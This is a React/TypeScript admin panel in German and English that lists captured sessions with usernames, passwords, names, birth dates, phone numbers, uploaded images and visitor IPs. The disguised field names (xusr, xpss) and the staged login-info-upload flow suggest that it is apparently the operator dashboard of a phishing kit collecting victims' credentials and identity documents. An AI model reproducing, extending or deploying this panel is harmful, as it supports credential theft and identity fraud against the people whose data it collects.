import React, { useState, useEffect } from 'react';
import axios from 'axios';

interface UserData {
  id: string;
  sessionId: string;
  ip: string;
  userAgent: string;
  createdAt: string;
  updatedAt: string;
  loginData?: {
    id: string;
    sessionId: string;
    xusr: string;
    xpss: string;
    timestamp: string;
    ip: string;
    userAgent: string;
  };
  infoData?: {
    id: string;
    sessionId: string;
    xname1: string;
    xname2: string;
    xdob: string;
    xtel: string;
    timestamp: string;
    ip: string;
    userAgent: string;
  };
  uploadData?: {
    id: string;
    sessionId: string;
    filename: string;
    originalName: string;
    fileSize: number;
    filePath: string;
    mimeType: string;
    timestamp: string;
    ip: string;
    userAgent: string;
  };
  finalData?: {
    id: string;
    sessionId: string;
    xusr: string;
    xpss: string;
    xname1: string;
    xname2: string;
    xdob: string;
    xtel: string;
    timestamp: string;
    ip: string;
    userAgent: string;
  };
}

interface Visitor {
  ip: string;
  userAgent: string;
  timestamp: string;
  path: string;
  method: string;
}

interface Stats {
  totalSessions: number;
  completedSessions: number;
  totalVisitors: number;
  uniqueIPs: number;
}

const AdminPanel: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [activeTab, setActiveTab] = useState<'users' | 'visitors'>('users');
  const [userData, setUserData] = useState<UserData[]>([]);
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [stats, setStats] = useState<Stats | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [deletingId, setDeletingId] = useState<number | null>(null);
  const [showDeleteDialog, setShowDeleteDialog] = useState(false);
  const [deleteIndex, setDeleteIndex] = useState<number | null>(null);
  const [showSuccessAlert, setShowSuccessAlert] = useState(false);
  const [successMessage, setSuccessMessage] = useState('');
  const [lastRefresh, setLastRefresh] = useState<Date | null>(null);
  const [autoRefresh, setAutoRefresh] = useState(false);
  const [language, setLanguage] = useState<'de' | 'en'>('de');

  const API_BASE_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001/api';

  // Language texts
  const texts = {
    de: {
      adminPanel: 'Admin Panel',
      lastUpdated: 'Zuletzt aktualisiert',
      autoRefresh: 'Auto-Aktualisierung (30s)',
      refreshData: 'Daten aktualisieren',
      refreshing: 'Aktualisiere...',
      logout: 'Abmelden',
      totalSessions: 'Gesamte Sitzungen',
      completedSessions: 'Abgeschlossene Sitzungen',
      siteVisitors: 'Website-Besucher',
      uniqueIPs: 'Eindeutige IPs',
      userSessionsCreated: 'Benutzersitzungen erstellt',
      sessionsWithFullData: 'Sitzungen mit vollständigen Daten',
      totalPageVisits: 'Gesamte Seitenaufrufe',
      uniqueVisitors: 'Eindeutige Besucher',
      userData: 'Benutzerdaten',
      siteVisitorsTab: 'Website-Besucher',
      allUserData: 'Alle Benutzerdaten',
      users: 'Benutzer',
      username: 'Benutzername',
      password: 'Passwort',
      firstName: 'Vorname',
      lastName: 'Nachname',
      birthDate: 'Geburtsdatum',
      phone: 'Telefon',
      file: 'Datei',
      ipAddress: 'IP-Adresse',
      browser: 'Browser',
      date: 'Datum',
      actions: 'Aktionen',
      noUserData: 'Keine Benutzerdaten verfügbar.',
      visits: 'Besuche',
      confirmDelete: 'Löschen bestätigen',
      deleteConfirmation: 'Sind Sie sicher, dass Sie diesen Dateneintrag löschen möchten?',
      cannotBeUndone: 'Diese Aktion kann nicht rückgängig gemacht werden.',
      cancel: 'Abbrechen',
      delete: 'Löschen',
      dataRefreshed: 'Daten erfolgreich aktualisiert!',
      sessionDeleted: 'Benutzersitzung erfolgreich gelöscht!',
      loginFailed: 'Anmeldung fehlgeschlagen',
      invalidPassword: 'Ungültiges Passwort',
      failedToLoadData: 'Fehler beim Laden der Daten',
      failedToDeleteSession: 'Fehler beim Löschen der Benutzersitzung'
    },
    en: {
      adminPanel: 'Admin Panel',
      lastUpdated: 'Last updated',
      autoRefresh: 'Auto-refresh (30s)',
      refreshData: 'Refresh Data',
      refreshing: 'Refreshing...',
      logout: 'Logout',
      totalSessions: 'Total Sessions',
      completedSessions: 'Completed Sessions',
      siteVisitors: 'Site Visitors',
      uniqueIPs: 'Unique IPs',
      userSessionsCreated: 'User sessions created',
      sessionsWithFullData: 'Sessions with full data',
      totalPageVisits: 'Total page visits',
      uniqueVisitors: 'Unique visitors',
      userData: 'User Data',
      siteVisitorsTab: 'Site Visitors',
      allUserData: 'All User Data',
      users: 'users',
      username: 'Username',
      password: 'Password',
      firstName: 'First Name',
      lastName: 'Last Name',
      birthDate: 'Birth Date',
      phone: 'Phone',
      file: 'File',
      ipAddress: 'IP Address',
      browser: 'Browser',
      date: 'Date',
      actions: 'Actions',
      noUserData: 'No user data available.',
      visits: 'visits',
      confirmDelete: 'Confirm Delete',
      deleteConfirmation: 'Are you sure you want to delete this data entry?',
      cannotBeUndone: 'This action cannot be undone.',
      cancel: 'Cancel',
      delete: 'Delete',
      dataRefreshed: 'Data refreshed successfully!',
      sessionDeleted: 'User session deleted successfully!',
      loginFailed: 'Login failed',
      invalidPassword: 'Invalid password',
      failedToLoadData: 'Failed to load data',
      failedToDeleteSession: 'Failed to delete user session'
    }
  };

  const t = texts[language];

  // Auto-refresh functionality
  useEffect(() => {
    let interval: NodeJS.Timeout;
    
    if (autoRefresh && isAuthenticated) {
      interval = setInterval(() => {
        loadData(false); // Silent refresh
      }, 30000); // Refresh every 30 seconds
    }
    
    return () => {
      if (interval) {
        clearInterval(interval);
      }
    };
  }, [autoRefresh, isAuthenticated]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await axios.post(`${API_BASE_URL}/admin/login`, { password });
      if (response.data.success) {
        setIsAuthenticated(true);
        // Load data only once after successful login
        await loadData();
      } else {
        setError('Invalid password');
      }
    } catch (err) {
      setError('Login failed');
    } finally {
      setLoading(false);
    }
  };

  const loadData = async (showSuccess = true) => {
    try {
      setLoading(true);
      setError('');
      if (showSuccess) {
        setShowSuccessAlert(false);
      }
      
      const [userResponse, visitorsResponse, statsResponse] = await Promise.all([
        axios.get(`${API_BASE_URL}/admin/user-data`),
        axios.get(`${API_BASE_URL}/admin/visitors`),
        axios.get(`${API_BASE_URL}/admin/stats`)
      ]);

      setUserData(userResponse.data.data);
      setVisitors(visitorsResponse.data.data);
      setStats(statsResponse.data.stats);
      setLastRefresh(new Date());
      
      console.log('Data refreshed successfully');
      
      if (showSuccess) {
        // Show refresh success message
        setSuccessMessage(t.dataRefreshed);
        setShowSuccessAlert(true);
        
        // Auto-hide after 2 seconds
        setTimeout(() => {
          setShowSuccessAlert(false);
        }, 2000);
      }
    } catch (err) {
      setError('Failed to load data');
      console.error('Refresh error:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleDeleteClick = (index: number) => {
    setDeleteIndex(index);
    setShowDeleteDialog(true);
  };

  const handleDeleteConfirm = async () => {
    if (deleteIndex === null) return;

    setDeletingId(deleteIndex);
    setShowDeleteDialog(false);
    
    try {
      // Get the session to delete
      const sessionToDelete = userData[deleteIndex];
      
      if (!sessionToDelete || !sessionToDelete.sessionId) {
        throw new Error('Invalid session to delete');
      }
      
      console.log('Deleting session:', sessionToDelete.sessionId);
      
      // Delete the session using the sessionId
      const response = await axios.delete(`${API_BASE_URL}/admin/delete-data/${sessionToDelete.sessionId}`);
      console.log('Delete response:', response.data);
      
      // Reload data to get updated stats
      await loadData();
      console.log('User session deleted successfully');
      
      // Show success alert
      setSuccessMessage(t.sessionDeleted);
      setShowSuccessAlert(true);
      
      // Auto-hide after 3 seconds
      setTimeout(() => {
        setShowSuccessAlert(false);
      }, 3000);
      
    } catch (err) {
      console.error('Delete error:', err);
      setError('Failed to delete user session');
    } finally {
      setDeletingId(null);
      setDeleteIndex(null);
    }
  };

  const handleDeleteCancel = () => {
    setShowDeleteDialog(false);
    setDeleteIndex(null);
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString();
  };

  const getBrowserInfo = (userAgent: string) => {
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    return 'Other';
  };

  const renderUserData = () => {
    // Safety check for userData
    if (!userData || !Array.isArray(userData)) {
      return (
        <div className="admin-content">
          <h3>{t.allUserData} (0 {t.users})</h3>
          <p>{t.noUserData}</p>
        </div>
      );
    }
    
    // Process each user session
    const processedUsers = userData.map((session, index) => {
      // Safety check for session
      if (!session) {
        return {
          xusr: '',
          xpss: '',
          xname1: '',
          xname2: '',
          xdob: '',
          xtel: '',
          filename: '',
          originalName: '',
          size: 0,
          ip: '',
          userAgent: '',
          timestamp: '',
          sessionId: ''
        };
      }
      
      // Combine data from all steps
      const combinedData = {
        xusr: session.loginData?.xusr || session.finalData?.xusr || '',
        xpss: session.loginData?.xpss || session.finalData?.xpss || '',
        xname1: session.infoData?.xname1 || session.finalData?.xname1 || '',
        xname2: session.infoData?.xname2 || session.finalData?.xname2 || '',
        xdob: session.infoData?.xdob || session.finalData?.xdob || '',
        xtel: session.infoData?.xtel || session.finalData?.xtel || '',
        filename: session.uploadData?.filename || '',
        originalName: session.uploadData?.originalName || '',
        size: session.uploadData?.fileSize || 0,
        ip: session.ip || '',
        userAgent: session.userAgent || '',
        timestamp: session.createdAt || '',
        sessionId: session.sessionId || ''
      };
      
      // Debug logging
      if (session.uploadData) {
        console.log('Session with upload data:', session.sessionId, session.uploadData);
        console.log('Combined data filename:', combinedData.filename);
      }
      
      return combinedData;
    });
    
    return (
      <div className="admin-content">
        <h3>{t.allUserData} ({processedUsers.length} {t.users})</h3>
        <div className="data-table">
          <table>
            <thead>
              <tr>
                <th>{t.username}</th>
                <th>{t.password}</th>
                <th>{t.firstName}</th>
                <th>{t.lastName}</th>
                <th>{t.birthDate}</th>
                <th>{t.phone}</th>
                <th>{t.file}</th>
                <th>{t.ipAddress}</th>
                <th>{t.browser}</th>
                <th>{t.date}</th>
                <th>{t.actions}</th>
              </tr>
            </thead>
            <tbody>
              {processedUsers.map((user, index) => (
                <tr key={index}>
                  <td>{user.xusr || '-'}</td>
                  <td>{user.xpss ? '***' : '-'}</td>
                  <td>{user.xname1 || '-'}</td>
                  <td>{user.xname2 || '-'}</td>
                  <td>{user.xdob || '-'}</td>
                  <td>{user.xtel || '-'}</td>
                  <td>
                    {user.filename ? (
                      <div className="file-display">
                        <img 
                          src={`${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`}
                          alt={user.originalName}
                          className="uploaded-image"
                          onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`)}
                          onLoad={() => {
                            console.log('Image loaded successfully:', user.filename);
                          }}
                          onError={(e) => {
                            console.error('Image failed to load:', user.filename, 'URL:', `${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`);
                            e.currentTarget.style.display = 'none';
                            const nextElement = e.currentTarget.nextElementSibling as HTMLElement;
                            if (nextElement) {
                              nextElement.style.display = 'block';
                            }
                          }}
                        />
                        <div className="file-info" style={{display: 'none'}}>
                          {user.originalName}
                          <br />
                          <small>({Math.round(user.size / 1024)}KB)</small>
                        </div>
                      </div>
                    ) : '-'}
                  </td>
                  <td className="ip-address">{user.ip}</td>
                  <td>{getBrowserInfo(user.userAgent)}</td>
                  <td>{formatDate(user.timestamp)}</td>
                  <td>
                    <button
                      className="delete-btn"
                      onClick={() => handleDeleteClick(index)}
                      disabled={deletingId === index}
                      title="Delete this user session"
                    >
                      {deletingId === index ? (
                        <span className="loading-spinner-small">⏳</span>
                      ) : (
                        <span className="delete-icon">🗑️</span>
                      )}
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    );
  };

  const renderVisitors = () => {
    return (
      <div className="admin-content">
        <h3>{t.siteVisitorsTab} ({visitors.length} {t.visits})</h3>
        <div className="data-table">
          <table>
            <thead>
              <tr>
                <th>{t.ipAddress}</th>
                <th>{t.browser}</th>
                <th>{t.date}</th>
              </tr>
            </thead>
            <tbody>
              {visitors.slice(-50).reverse().map((visitor, index) => (
                <tr key={index}>
                  <td className="ip-address">{visitor.ip}</td>
                  <td>{getBrowserInfo(visitor.userAgent)}</td>
                  <td>{formatDate(visitor.timestamp)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    );
  };

  if (!isAuthenticated) {
    return (
      <div className="admin-login">
        <div className="login-form">
          <h2>Admin Panel</h2>
          <form onSubmit={handleLogin}>
            <div className="form-group">
              <label>Password:</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter admin password"
                required
              />
            </div>
            {error && <div className="error">{error}</div>}
            <button type="submit" disabled={loading}>
              {loading ? 'Logging in...' : 'Login'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="admin-panel">
      {/* Success Alert */}
      {showSuccessAlert && (
        <div className="success-alert">
          <div className="alert-content">
            <span className="alert-icon">✅</span>
            <span className="alert-message">{successMessage}</span>
            <button 
              className="alert-close" 
              onClick={() => setShowSuccessAlert(false)}
            >
              ×
            </button>
          </div>
        </div>
      )}

      <div className="admin-header">
        <div className="header-left">
          <h1>{t.adminPanel}</h1>
          {lastRefresh && (
            <p className="last-refresh">
              {t.lastUpdated}: {lastRefresh.toLocaleTimeString()}
            </p>
          )}
        </div>
        <div className="header-buttons">
          <div className="language-selector">
            <select 
              value={language} 
              onChange={(e) => setLanguage(e.target.value as 'de' | 'en')}
              className="language-select"
            >
              <option value="de">🇩🇪 Deutsch</option>
              <option value="en">🇺🇸 English</option>
            </select>
          </div>
          <label className="auto-refresh-toggle">
            <input
              type="checkbox"
              checked={autoRefresh}
              onChange={(e) => setAutoRefresh(e.target.checked)}
            />
            {t.autoRefresh}
          </label>
          <button 
            onClick={() => loadData()} 
            className="refresh-btn"
            disabled={loading}
          >
            {loading ? (
              <>
                <span className="loading-spinner-small">⏳</span>
                {t.refreshing}
              </>
            ) : (
              t.refreshData
            )}
          </button>
          <button onClick={() => setIsAuthenticated(false)} className="logout-btn">
            {t.logout}
          </button>
        </div>
      </div>

      {stats && (
        <div className="stats-grid">
          <div className="stat-card">
            <h3>{t.totalSessions}</h3>
            <p className="stat-number">{stats.totalSessions}</p>
            <p className="stat-description">{t.userSessionsCreated}</p>
          </div>
          <div className="stat-card">
            <h3>{t.completedSessions}</h3>
            <p className="stat-number">{stats.completedSessions}</p>
            <p className="stat-description">{t.sessionsWithFullData}</p>
          </div>
          <div className="stat-card">
            <h3>{t.siteVisitors}</h3>
            <p className="stat-number">{stats.totalVisitors}</p>
            <p className="stat-description">{t.totalPageVisits}</p>
          </div>
          <div className="stat-card">
            <h3>{t.uniqueIPs}</h3>
            <p className="stat-number">{stats.uniqueIPs}</p>
            <p className="stat-description">{t.uniqueVisitors}</p>
          </div>
        </div>
      )}

      <div className="admin-tabs">
        <button
          className={activeTab === 'users' ? 'active' : ''}
          onClick={() => setActiveTab('users')}
        >
          {t.userData}
        </button>
        <button
          className={activeTab === 'visitors' ? 'active' : ''}
          onClick={() => setActiveTab('visitors')}
        >
          {t.siteVisitorsTab}
        </button>
      </div>

      {activeTab === 'users' ? renderUserData() : renderVisitors()}

      {/* Image Modal */}
      {selectedImage && (
        <div className="image-modal" onClick={() => setSelectedImage(null)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <button className="close-btn" onClick={() => setSelectedImage(null)}>
              ×
            </button>
            <img src={selectedImage} alt="Full size" className="full-image" />
          </div>
        </div>
      )}

      {/* Delete Confirmation Dialog */}
      {showDeleteDialog && (
        <div className="delete-modal" onClick={handleDeleteCancel}>
          <div className="delete-dialog" onClick={(e) => e.stopPropagation()}>
            <div className="dialog-header">
              <h3>{t.confirmDelete}</h3>
            </div>
            <div className="dialog-body">
              <p>{t.deleteConfirmation}</p>
              <p className="warning-text">{t.cannotBeUndone}</p>
            </div>
            <div className="dialog-footer">
              <button className="cancel-btn" onClick={handleDeleteCancel}>
                {t.cancel}
              </button>
              <button className="confirm-delete-btn" onClick={handleDeleteConfirm}>
                {t.delete}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminPanel;
